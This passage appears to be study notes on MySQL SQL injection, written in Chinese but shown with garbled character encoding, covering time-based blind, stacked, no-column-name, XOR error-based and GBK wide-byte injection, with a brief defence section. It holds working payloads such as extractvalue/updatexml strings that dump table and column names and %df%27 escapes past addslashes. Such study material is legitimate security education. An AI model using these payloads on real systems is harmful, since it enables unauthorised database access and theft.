- expr: è¦é‡å¤æ‰§è¡Œçš„è¡¨è¾¾å¼ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªè®¡ç®—å¯†é›†å‹æ“ä½œï¼‰

MySQL ä¼šè®¡ç®— expr æŒ‡å®šçš„è¡¨è¾¾å¼ count æ¬¡ï¼Œè¿”å›ç»“æœå§‹ç»ˆæ˜¯ 0

`select if(1=1,benchmark(10000000,md5('test')),0)`

å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œåˆ™æ‰§è¡Œå¤§é‡è®¡ç®—å¯¼è‡´å»¶è¿Ÿï¼›ä¸ºå‡åˆ™ç«‹å³è¿”å›ã€‚

ä¾‹å¦‚æ¢æµ‹æ•°æ®åº“åé•¿åº¦

`select if(length(database())=8, benchmark(10000000,md5('test')), 0)`


åé¢çš„ç›²æ³¨è¿‡ç¨‹ä¸å¸ƒå°”ç›²æ³¨ç±»ä¼¼




#### å †å æ³¨å…¥

å †å æ³¨å…¥ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†è¯­å¥å †å åœ¨ä¸€èµ·è¿›è¡ŒæŸ¥è¯¢

åŸç†ï¼š`mysql_multi_query()` æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œè¯­å¥é—´ä»¥åˆ†å·ï¼ˆ;ï¼‰åˆ†éš”,åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¸¤æ¡è¯­å¥ä¼šä¸€èµ·æ‰§è¡Œï¼Œè¿™å°±æ˜¯å †å æ³¨å…¥ã€‚

ä½†åœ¨å®é™…åœºæ™¯ä¸­ä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯`mysqli_ query()`å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™

å…¶ä¸è”åˆæ³¨å…¥çš„ç›¸åŒç‚¹åœ¨äºæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œè€ŒåŒºåˆ«æ˜¯`union` æˆ–è€…`union all`æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¸¸è§çš„æ˜¯ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚åœ¨å­—ç¬¦é•¿åº¦é™åˆ¶èŒƒå›´å†…ï¼Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥

åœ¨è¿‡æ»¤äº† `select` å’Œ `where` çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ `show`æ¥çˆ†å‡ºæ•°æ®åº“åï¼Œè¡¨åï¼Œå’Œåˆ—åã€‚

- show

        show datebases; //æ•°æ®åº“ã€‚
        show tables; //è¡¨åã€‚
        show columns from table; //å­—æ®µã€‚

- alert

ä½œç”¨ï¼šä¿®æ”¹å·²çŸ¥è¡¨çš„åˆ—ã€‚ï¼ˆ æ·»åŠ ï¼šadd | ä¿®æ”¹ï¼šalertï¼Œchange | æ’¤é”€ï¼šdrop ï¼‰

ç”¨æ³•ï¼š

- æ·»åŠ ä¸€ä¸ªåˆ—

`alter table " table_name" add " column_name"  type;`

- åˆ é™¤ä¸€ä¸ªåˆ—

`alter table " table_name" drop " column_name"  type;`

- æ”¹å˜åˆ—çš„æ•°æ®ç±»å‹

`alter table " table_name" alter column " column_name" type;`
    
- æ”¹åˆ—å

`alter table " table_name" change " column1" " column2" type;`

`alter table "table_name" rename "column1" to "column2";`

#### æ— åˆ—åæ³¨å…¥

å…¶å®æ˜¯é’ˆå¯¹`information_schema` åº“è¢«è¿‡æ»¤çš„æƒ…å†µï¼Œå¯¼è‡´ä¸èƒ½ç›´æ¥è¯»å–åˆ—å

é‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°å…¶ä»–åº“æ¥æ³¨å…¥, ä¾‹å¦‚: `sys.schema_auto_increment_columns`, `sys.schema_table_statistics_with_buffer`, `mysql.innodb_table_stats`ç­‰ç­‰

ä½†æ˜¯è¿™äº›è¡¨éƒ½ä¸èƒ½è·å¾—åˆ—åç­‰, åªèƒ½è·å¾—è¡¨åï¼Œä»è€Œå¼•å‡ºçš„æ— åˆ—åæ³¨å…¥

ä¸»è¦ç›®çš„æ˜¯ï¼šè·å–åˆ—åï¼Œä»è€Œè¿›è¡Œæ­£å¸¸çš„æ³¨å…¥

##### å­æŸ¥è¯¢æ´¾ç”Ÿè¡¨

**åŸç†**

æ— åˆ—åæ³¨å…¥çš„åŸç†æ˜¯é€šè¿‡å­æŸ¥è¯¢è¿æ¥æŸ¥è¯¢ä¸¤ä¸ªç›¸åŒçš„è¡¨, æ•°æ®åº“ä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨, å°†ä¸¤ä¸ªè¡¨çš„æŸ¥è¯¢æ•°æ®æ”¾å…¥, å½“æ”¾å…¥ä¸€ä¸ªè™šæ‹Ÿè¡¨ä¸­å·²æœ‰çš„åˆ—åæ—¶å°±ä¼šæŠ¥é”™

**æ“ä½œ**

ä¾‹å¦‚ï¼š`select * from (select * from users u1 join users u2) a;`

ä¼šäº§ç”Ÿæ´¾ç”Ÿè¡¨a,å¦‚æœ`users`ä¸­å­˜åœ¨åˆ—å`id`å°±ä¼šæŠ¥é”™

`Duplicate column name 'id'`

ç„¶åé€šè¿‡ `using` æ¥æ’é™¤åˆ—å `id`, ç»§ç»­çˆ†å‡ºå…¶ä»–çš„åˆ—å

`using` ä¼šè‡ªåŠ¨åˆå¹¶ä¸¤ä¸ªè¡¨ä¸­çš„ç›¸åŒåˆ—å

`select * from (select * from users u1 join users u2 using(id)) a;`

ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥çˆ†å‡ºæ‰€æœ‰çš„è¡¨å

##### unionæ´¾ç”Ÿè¡¨

**åŸç†**

é€šè¿‡è™šæ‹Ÿæ´¾ç”Ÿè¡¨çš„æ•°å­—åˆ—åï¼Œæ¥ä»£æ›¿åŸæœ‰çš„åˆ—å

**æ“ä½œ**

é€šè¿‡unionæŸ¥è¯¢ï¼Œéœ€çŒœæµ‹åˆ—æ•°ï¼Œå‡è®¾è¿™é‡Œä¸º5åˆ—

`select 1,2,3,4,5 union select * from table;`

ä¼šæŠŠtableçš„æ•°æ®å­˜æ”¾åˆ°ä¸€ä¸ªè™šæ‹Ÿè¡¨ä¸­ï¼ŒåŒæ—¶ä¸ºäº”ä¸ªåˆ—è®¾ç½®åˆ«å1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ã€‚

è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åˆ«å1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5æ¥ä»£æ›¿åˆ—åï¼Œç›¸å½“äºåˆ—åè¢«æ›¿æ¢æˆäº†æ•°å­—

è¿›ä¸€æ­¥æŸ¥è¯¢

``select 2 from (select 1,2,3,4,5 union select * from table)a;``

ä¸€äº›tips

**åœ¨æ•°æ®åº“æŸ¥è¯¢bypassè¿‡æ»¤`**

phpç«¯ä¸éœ€è¦\`\`ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“ä¸­è¡¨åéœ€è¦ç”¨\`\`æ¥åŒ…è£¹,å¦‚\`table\`

è¿™æ—¶``select 2 from (select 1,2,3,4,5 union select * from `table`)a;``

æŸ¥è¯¢ä¸å‡ºæ¥æ•°æ®ï¼ˆMySQL 5.7+ å·²ç»æ”¯æŒæ•°å­—ä½œä¸ºåˆ—åäº†

å¦‚ä¸‹æ‰å¯ä»¥
``select `2` from (select 1,2,3,4,5 union select * from `table`)a;``

å½“ä¸ºåˆ—åè¿‡æ»¤``æ—¶ï¼Œå¯ä»¥å†æ¬¡ä½¿ç”¨æ´¾ç”Ÿè¡¨åˆ«åæ¥bypass

ä¸ºæ´¾ç”Ÿè¡¨açš„æ•°å­—åˆ—å2è®¾ç½®åˆ«åb,é€šè¿‡bæŸ¥è¯¢åˆ—åä¸å†éœ€è¦\`\`

``select b from (select 1,2 as b,3,4 as c,5 as d union select * from table) a``



**åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—**

``select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from `table`)a;``

`0x2d`æ˜¯`-`ï¼Œç›¸å½“äºæŸ¥è¯¢2-3çš„åˆ—

[å‚è€ƒ](https://err0r.top/article/mardasctf/#/)
[å‚è€ƒ](https://erzbir.com/archives/no-column-sql-injection#/)


#### å¼‚æˆ–æ³¨å…¥

å¼‚æˆ–æ³¨å…¥çš„åŸç†æ˜¯é€šè¿‡å¼ºåˆ¶ç±»å‹è½¬åŒ–æŠ¥é”™çš„é”™è¯¯ä¿¡æ¯æ¥è·å–ä¿¡æ¯ã€‚

mysqlé‡Œå¼‚æˆ–è¿ç®—ç¬¦ä¸º`^` æˆ–è€… `xor`ï¼Œè¿™é‡Œçš„å¼‚æˆ–æ³¨å…¥ä¸»è¦åˆ©ç”¨`^`

ä¸¤è€…çš„åŒºåˆ«åœ¨äº `^`è¿ç®—ç¬¦åš**ä½å¼‚æˆ–è¿ç®—** å¦‚`1^2=3`

è€Œ `xor`åš**é€»è¾‘è¿ç®—** `1 xor 0` ä¼šè¾“å‡º1ï¼Œå…¶ä»–æƒ…å†µè¾“å‡ºå…¶ä»–æ‰€æœ‰æ•°æ® 

xorçš„ä½œç”¨åŒ…æ‹¬ä½†ä¸é™äº**ç»•è¿‡æ•æ„Ÿè¯è¿‡æ»¤ã€åˆ¤æ–­è¿‡æ»¤å†…å®¹å’Œç›´æ¥è¿›è¡Œç›²æ³¨åˆ©ç”¨**


äºæ˜¯payloadå¯ä»¥å†™æˆ

`a' ^ extractvalue(1,concat('~',(select(database()))))#`

åŒç†`updatexml()`å‡½æ•°ä¹Ÿå¯ä»¥ï¼Œç”¨æ³•ç›¸åŒ

##### ^è¿ç®—ç¬¦

**åŸç†**

^ ï¼šè¦æ±‚ä¸¤è¾¹éƒ½æ˜¯æ•°å­—ï¼Œæ‰€ä»¥`extractvalue()`ä¸€å®šä¼šæ‰§è¡Œï¼ˆå®ƒéœ€è¦å…ˆæ±‚å€¼æ‰èƒ½å‚ä¸å¼‚æˆ–è¿ç®—

extractvalue(1,concat('~',(select(database()))))

- extractvalue(): è¿™æ˜¯æ˜¯ MySQL çš„ XML å¤„ç†å‡½æ•°
- ç¬¬ä¸€ä¸ªå‚æ•°`1`: 1æ˜¯ä¸€ä¸ªä¼ª XML æ–‡æ¡£
- ç¬¬äºŒä¸ªå‚æ•°`concat()`: ä½¿ç”¨ concat() æ„å»ºä¸€ä¸ªæ— æ•ˆçš„ XPath è¡¨è¾¾å¼

å½“è¢«æ³¨å…¥å`extractvalue()`è¢«æ‰§è¡Œ

ä¼šç”Ÿæˆä¸€ä¸ªæ— æ•ˆçš„ XPath è¡¨è¾¾å¼ï¼ˆå¦‚ ~database_nameï¼‰

MySQL ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œé”™è¯¯ä¿¡æ¯ä¸­ä¼šåŒ…å«æ•°æ®åº“åï¼š

    XPATH syntax error: '~database_name'

åŒç†

[]ä¸­çš„nameæ›¿æ¢ä¸ºå®é™…nameå³å¯

è¡¨åï¼š`a'^extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('[database_name]'))))`

åˆ—åï¼š`a'^extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('[table_name]'))))`

å­—æ®µï¼š`a'^extractvalue(1,concat('~',(select(group_concat([column_name]))from([database_nam].[table_name]))))`

tipsï¼šé’ˆå¯¹é•¿åº¦è¿‡æ»¤é™åˆ¶

åˆ©ç”¨`right()`å‡½æ•°ï¼Œå’Œ`left()`å‡½æ•°

è‹¥ä¸€ä¸ªä¸è¡Œå°±åŒæ—¶ä½¿ç”¨

`a'^extractvalue(1,concat('~',(select(right([column_name],30))from([database_nam].[table_name]))))`


è·å–å·¦è¾¹ï¼š

`a'or(updatexml("~",concat("~",(select(group_concat(left([column_name],25)))from([database_nam].[table_name]))),"~"))`

è·å–å³è¾¹ï¼š

`a'or(updatexml("~",concat("~",(select(group_concat(right([column_name],25)))from([database_nam].[table_name]))),"~"))`



#### å®½å­—èŠ‚æ³¨å…¥

**åŸºç¡€æ¦‚å¿µ**

å®½å­—èŠ‚æ˜¯ç›¸å¯¹äºasciiè¿™æ ·å•å­—èŠ‚è€Œè¨€çš„ï¼›
GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS ç­‰è¿™äº›éƒ½æ˜¯å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚

è¿™é‡Œæ‰€è¯´çš„å®½å­—èŠ‚æ³¨å…¥ï¼Œå…¶å®æ˜¯ä¸ºäº†ç»•è¿‡è½¬ä¹‰å‡½æ•°ï¼ˆä¸ºäº†è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„ä¸€äº›æ•°æ®ï¼Œå¯¹ç‰¹æ®Šçš„å­—ç¬¦åŠ ä¸Šåæ–œæ â€œ\â€è¿›è¡Œè½¬ä¹‰ï¼‰

Mysqlä¸­è½¬ä¹‰çš„å‡½æ•°æœ‰`addslashes`ï¼Œ`mysql_real_escape_string`ï¼Œ`mysql_escape_string` ç­‰

##### sqlçš„æ‰§è¡Œè¿‡ç¨‹

è¿™é‡Œè®²ä¸€ä¸‹sqlçš„æ‰§è¡Œè¿‡ç¨‹ä¸­å­—ç¬¦çš„å˜åŒ–

ä»¥phpä¸ºä¾‹ï¼Œå½“ç”¨æˆ·è¾“å…¥æ•°æ®ä¹‹åï¼Œphpæ ¹æ®é»˜è®¤ç¼–ç ç”Ÿæˆsqlè¯­å¥å‘é€ç»™æœåŠ¡å™¨ï¼Œæ²¡æœ‰è®¾ç½®`default_charset`çš„æ—¶å€™ï¼Œphpä¼šæ ¹æ®æ•°æ®åº“ä¸­çš„ç¼–ç è‡ªåŠ¨æ¥ç¡®å®šä½¿ç”¨é‚£ç§ç¼–ç 

åˆ¤æ–­æ–¹å¼

```php
<?php $m=â€å­—â€; echo strlen($m); 
# è¾“å‡º3è¯´æ˜æ˜¯utf-8
# è¾“å‡º2è¯´æ˜æ˜¯gbk

```

æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åä¼šæŠŠå®¢æˆ·ç«¯ç¼–ç çš„å­—ç¬¦ä¸²è½¬æ¢æˆè¿æ¥å±‚ç¼–ç å­—ç¬¦ä¸²

> å…·ä½“æµç¨‹æ˜¯å…ˆä½¿ç”¨ç³»ç»Ÿå˜é‡ `character_set_client` å¯¹ SQL è¯­å¥è¿›è¡Œè§£ç åï¼Œç„¶åä½¿ç”¨ ç³»ç»Ÿå˜é‡ `character_set_connection` å¯¹è§£ç åçš„åå…­è¿›åˆ¶è¿›è¡Œç¼–ç ï¼ˆé»˜è®¤éƒ½æ˜¯gbkç¼–ç ï¼‰

è¿›è¡Œå†…éƒ¨æ“ä½œå‰ï¼ŒæŒ‰ç…§å¦‚ä¸‹è§„åˆ™è½¬åŒ–è¯·æ±‚ä¸ºå†…éƒ¨æ“ä½œå­—ç¬¦é›†

    ä½¿ç”¨å­—æ®µ `CHARACTER SET` è®¾å®šå€¼

    è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œä½¿ç”¨å¯¹åº”æ•°æ®è¡¨çš„`DEFAULT CHARACTER SET`è®¾å®šå€¼

    è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®åº“çš„`DEFAULT CHARACTER SET`è®¾å®šå€¼

    è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨`character_set_server`è®¾å®šå€¼ï¼ˆé»˜è®¤gbkç¼–ç ï¼‰

æ‰§è¡Œå®Œ SQL è¯­å¥ä¹‹åï¼Œå°†æ‰§è¡Œç»“æœæŒ‰ç…§ `character_set_results` ç¼–ç è¿›è¡Œè¾“å‡ºã€‚

##### åŸç†

å®½å­—èŠ‚æ³¨å…¥æŒ‡çš„æ˜¯ mysql æ•°æ®åº“åœ¨ä½¿ç”¨å®½å­—èŠ‚ï¼ˆGBKï¼‰ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼ˆæ¯”å¦‚%dfï¼‰ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ï¼Œ


å®½å­—èŠ‚æ³¨å…¥å‘ç”Ÿçš„ä½ç½®å°±æ˜¯
PHPå‘é€è¯·æ±‚åˆ°MYSQLæ—¶å­—ç¬¦é›†ä½¿ç”¨`character_set_client`è®¾ç½®å€¼è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ï¼Œ
ç„¶åæœåŠ¡å™¨ä¼šæ ¹æ®`character_set_connection`æŠŠè¯·æ±‚è¿›è¡Œè½¬ç ï¼Œä»`character_set_client`è½¬æˆ`character_set_connection`ï¼Œ
ç„¶åæ›´æ–°åˆ°æ•°æ®åº“çš„æ—¶å€™ï¼Œå†è½¬åŒ–æˆå­—æ®µæ‰€å¯¹åº”çš„ç¼–ç 


##### addslashes()
å½“ä½¿ç”¨`addslashes()`è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œä¼šæŠŠ'å³`%27`è½¬ä¹‰æˆ\\'ï¼Œå³`%5c%27`

æ­¤æ—¶è¾“å…¥1' æ­¤æ—¶çš„sqlè¯­å¥ä¸º

`select * from tables where id = '1 \''`


å¯ä»¥æ„é€ ç‰¹æ®Šå­—ç¬¦`%df%27`,è½¬ä¹‰åä¸º`%df%5c%27`,mysqlä¼šæŠŠ`%df%5c`è¯†åˆ«æˆå®½å­—èŠ‚è½¬åŒ–æˆæ±‰å­—`é‹`

æ•°æ®å˜åŒ–è¿‡ç¨‹

    %df%27===>(addslashes)====>%df%5c%27====>(GBK)====>é‹'
    â€‹
    ç”¨æˆ·è¾“å…¥==>è¿‡æ»¤å‡½æ•°==>ä»£ç å±‚çš„$sql==>mysqlå¤„ç†è¯·æ±‚==>mysqlä¸­çš„sql

ä»è€Œä½¿è¾“å…¥`%df%27`è½¬åŒ–æˆäº†`é‹'`å¯¼è‡´sqlè¯­å¥è¢«é—­åˆ

è¾“å…¥`%df' --'`å³å¯ä½¿'é€ƒé€¸åŒæ—¶æ³¨é‡Šåé¢çš„'ï¼Œè¿™æ ·å°±å¯ä»¥æ„é€ æ³¨å…¥è¯­å¥äº†

æ­¤æ—¶çš„sqlè¯­å¥

`select * from tables where id = '1 é‹' --\''`

##### iconv()

ä¸ºäº†é¿å…å®½å­—èŠ‚æ³¨å…¥,ä½¿ç”¨iconvå‡½æ•°ï¼ˆèƒ½å¤Ÿå®Œæˆå„ç§å­—ç¬¦é›†é—´çš„è½¬æ¢ï¼‰

```php

$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$id = iconv('utf-8', 'gbk', $id); # ç”±utf-8 â€“> gbk

```

å¯ä»¥ä½¿ç”¨é€†å‘æ€ç»´ï¼Œå…ˆæ‰¾ä¸€ä¸ªgbkçš„æ±‰å­—éŒ¦,éŒ¦çš„utf-8ç¼–ç æ˜¯`0xe98ca6`ï¼Œå®ƒçš„gbkç¼–ç æ˜¯`0xe55c`,

å½“ä¼ å…¥çš„å€¼æ˜¯`éŒ¦'`ï¼Œ`'`é€šè¿‡`addslashes`è½¬ä¹‰ä¸º`\'`(%5c%27)

éŒ¦é€šè¿‡`icov`è½¬æ¢ä¸º`%e5%5c`ï¼Œæœ€ç»ˆ`éŒ¦'`å˜ä¸ºäº†`%e5%5c%5c%27`,ä¸éš¾çœ‹å‡º`%5c%5c`æ­£å¥½æŠŠåæ–œæ è½¬ä¹‰ï¼Œä½¿å•å¼•å·é€ƒé€¸ï¼Œé€ æˆæ³¨å…¥

å­—ç¬¦å˜åŒ–

    éŒ¦%27===>(addslashes)====>éŒ¦%5c%27====>(iconv)====>%e5%5c%5c%27====>éŒ¦'====>éŒ¦'
    
    ç”¨æˆ·è¾“å…¥===>è¿‡æ»¤å‡½æ•°===>ä»£ç å±‚çš„$sql===>è½¬æ¢å‡½æ•°===>ä»£ç å±‚çš„$sql===>mysqlå¤„ç†è¯·æ±‚===>mysqlä¸­çš„sql


è¿™é‡Œåœ¨ç»è¿‡`icov()`å‡½æ•°è½¬åŒ–åï¼Œå·²ç»æ˜¯gbkç¼–ç äº†ï¼ŒåŸæ¥çš„åªæœ‰`addslashes()`æ—¶ï¼Œmysqlå¤„ç†çš„æ˜¯asciiå•å­—èŠ‚å­—ç¬¦ï¼ˆ**å®½å­—èŠ‚æ³¨å…¥çš„æ€»ç»“ï¼šä¼ å…¥æ˜¯å•å­—èŠ‚ï¼Œä¼ å‡ºæ˜¯åŒå­—èŠ‚**ï¼‰ï¼Œè¿™é‡Œçš„`%e5%5c%5c%27`å·²ç»ä¸ºgbkç¼–ç å³`éŒ¦'`


##### é˜²æŠ¤

    ä½¿ç”¨mysql_set_charset(GBK)æŒ‡å®šå­—ç¬¦é›†

    SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary
    
    ä½¿ç”¨mysql_real_escape_stringè¿›è¡Œè½¬ä¹‰

    mysql_real_escape_stringä¸addslashesçš„ä¸åŒä¹‹å¤„åœ¨äºå…¶ä¼šè€ƒè™‘å½“å‰è®¾ç½®çš„å­—ç¬¦é›†ï¼ˆä½¿ç”¨mysql_set_charsetæŒ‡å®šå­—ç¬¦é›†ï¼‰ï¼Œä¸ä¼šå‡ºç°å‰é¢çš„dfå’Œ5cæ‹¼æ¥ä¸ºä¸€ä¸ªå®½å­—èŠ‚çš„é—®é¢˜
    ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶éœ€è¦åŒæ—¶æ»¡è¶³æ‰è¡Œï¼Œç¼ºä¸€ä¸å¯ã€‚



[å‚è€ƒ](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/#/)